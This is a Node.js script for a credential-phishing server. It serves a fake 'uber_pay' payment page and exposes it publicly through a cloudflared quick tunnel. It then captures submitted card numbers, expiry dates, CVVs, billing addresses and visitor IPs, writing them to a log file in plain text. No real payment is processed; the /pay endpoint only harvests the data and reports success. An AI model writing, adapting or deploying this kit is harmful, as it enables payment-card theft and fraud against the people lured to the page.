const http = require('http');
const fs = require('fs');
const net = require('net');
const path = require('path');
const { spawn } = require('child_process');

const GREEN = '\u001b[32m';
const RED = '\u001b[31m';
const YELLOW = '\u001b[33m';
const PURPLE = '\u001b[35m';
const RESET = '\u001b[0m';

const TEMPLATE_PATH = path.join(__dirname, 'uber_pay.html');

function getWritableLogPath() {
  const candidates = [
    path.join(process.cwd(), 'server.log'),
    path.join(require('os').homedir(), 'square-server.log'),
    path.join(require('os').tmpdir(), 'square-server.log')
  ];

  for (const candidate of candidates) {
    try {
      const testFile = `${candidate}.tmp`;
      fs.writeFileSync(testFile, 'ok');
      fs.unlinkSync(testFile);
      return candidate;
    } catch (_err) {
      // Try the next location.
    }
  }

  return path.join(process.cwd(), 'server.log');
}

const LOG_PATH = getWritableLogPath();
const LOG_STREAM = fs.createWriteStream(LOG_PATH, { flags: 'a' });
const HTML_PAGE = fs.readFileSync(TEMPLATE_PATH, 'utf8');

// For Docker: log to stdout
function logToTerminal(message) {
  console.log(message);
  LOG_STREAM.write(message + '\n');
}

function getIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string' && forwarded.trim()) {
    return forwarded.split(',')[0].trim();
  }

  const socketAddress = req.socket && req.socket.remoteAddress;
  if (socketAddress) {
    return socketAddress.replace(/^::ffff:/, '');
  }

  return 'unknown';
}

function logRequest(req, res, next) {
  const method = req.method || 'GET';
  const pathname = new URL(req.url || '/', 'http://localhost').pathname;
  const ip = getIP(req);
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');

  let color = YELLOW;
  switch (method) {
    case 'GET':
      color = GREEN;
      break;
    case 'POST':
      color = RED;
      break;
    default:
      color = YELLOW;
  }

  const message = `${color}[${timestamp}] ${method} "${method} ${pathname}" from ${ip}${RESET}`;
  console.log(message);
  LOG_STREAM.write(`[${timestamp}] ${method} "${method} ${pathname}" from ${ip}\n`);
  next();
}

function getAvailablePort(startPort = 8080) {
  return new Promise((resolve, reject) => {
    const tryPort = (port) => {
      const tester = net.createServer();

      tester.once('error', (err) => {
        if (err.code === 'EADDRINUSE') {
          resolve(getAvailablePort(port + 1));
          return;
        }
        reject(err);
      });

      tester.once('listening', () => {
        const address = tester.address();
        tester.close(() => resolve(address.port));
      });

      tester.listen(port);
    };

    tryPort(startPort);
  });
}

function startCloudflared(port) {
  return new Promise((resolve) => {
    const child = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${port}`], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: process.env
    });

    let publicURL = '';

    const handleOutput = (chunk) => {
      const text = chunk.toString();
      const match = text.match(/https:\/\/[-a-zA-Z0-9]+\.trycloudflare\.com/g);
      if (match && match.length > 0) {
        publicURL = match[0];
        console.log(`${PURPLE}Cloudflared URL: ${publicURL}${RESET}`);
      }
    };

    child.stdout.on('data', handleOutput);
    child.stderr.on('data', handleOutput);

    child.on('error', (err) => {
      console.error(`Cloudflared start error: ${err.message}`);
      resolve('');
    });

    setTimeout(() => resolve(publicURL), 2000);
  });
}

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];

    req.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

async function main() {
  const port = await getAvailablePort(8080);
  const publicURL = await startCloudflared(port);

  const server = http.createServer(async (req, res) => {
    logRequest(req, res, async () => {
      const url = new URL(req.url || '/', `http://localhost:${port}`);

      if (req.method === 'GET' && url.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(HTML_PAGE);
        return;
      }

      if (req.method === 'POST' && url.pathname === '/pay') {
        try {
          const body = await readRequestBody(req);
          const data = JSON.parse(body);

          const submitted = [
            '',
            '----- FORM SUBMISSION -----',
            `Card Holder: ${data.cardHolder || ''}`,
            `Card Number:   ${data.cardNumber || ''}`,
            `Expiry:    ${data.expiryDate || ''}`,
            `CVV:           ${data.cvv || ''}`,
            `Address:       ${data.address || ''}`,
            `City:          ${data.city || ''}`,
            `State:         ${data.state || ''}`,
            `Zip:           ${data.zipCode || ''}`,
            `IP Address:    ${getIP(req)}`,
            '----------------------------',
            ''
          ].join('\n');

          console.log(submitted);
          LOG_STREAM.write(`${submitted}\n`);

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({status: 'success'}));
          return;
        } catch (error) {
          console.error(error);
          res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
          res.end('Internal Server Error');
          return;
        }
      }

      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Not Found');
    });
  });

  server.listen(port, '0.0.0.0', () => {
    console.log(`${PURPLE}Server running on http://localhost:${port}${RESET}`);
    if (publicURL) {
      console.log(`${PURPLE}Public URL: ${publicURL}${RESET}`);
    }
  });

  process.on('SIGINT', () => {
    LOG_STREAM.end();
    process.exit(0);
  });
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
